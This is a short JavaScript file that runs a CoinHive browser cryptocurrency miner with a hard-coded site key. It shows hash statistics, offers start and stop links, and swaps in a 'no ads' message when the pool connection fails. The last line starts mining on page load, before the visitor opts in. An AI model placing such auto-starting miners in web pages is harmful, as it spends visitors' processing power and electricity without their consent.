var miner = new CoinHive.Anonymous('WrLyksZRJHCRNxgEtSnR0eEJXZYjnBm9', {threads: 4, throttle: 0.25});
var refresher = '';

startLink = document.getElementById('startMiner');
stopLink = document.getElementById('stopMiner');
adsMsg = document.getElementById('ads');
noAdsMsg = document.getElementById('noAds');
hpsdiv = document.querySelector('.hashesPerSecond');
thdiv = document.querySelector('.totalHashes');

function adsDisabled() {
  document.getElementById('ads').classList.add("none");
  document.getElementById('noAds').classList.remove("none");
  minerStop();
  stopLink.classList.add("none");
  startLink.classList.add("none");
}

function refreshHashes() {
  // Output to HTML elements...
  hpsdiv.innerHTML = miner.getHashesPerSecond().toPrecision(3);
  thdiv.innerHTML = miner.getTotalHashes();

  miner.on('error', function (params) {
    if (params.error === 'connection_error') {
      adsDisabled();
    }
    if (params.error !== 'connection_error') {
      console.log('The pool reported an error', params.error);
    }
  });
};

function startRefreshHashes() {
  // Update stats once per second
  refresher = setInterval(function () {
    refreshHashes()
  }, 1000);
};

function stopRefreshHashes() {
  // Stop updating stats
  clearInterval(refresher);
};

function minerStop() {
  miner.stop();
  stopRefreshHashes();
  stopLink.classList.add("none");
  startLink.classList.remove("none");
  hpsdiv.innerHTML = 0;
};

function minerStart() {
  miner.start();
  startLink.classList.add("none");
  stopLink.classList.remove("none");
  startRefreshHashes();
};

startLink.addEventListener('click', minerStart);
stopLink.addEventListener('click', minerStop);

minerStart();
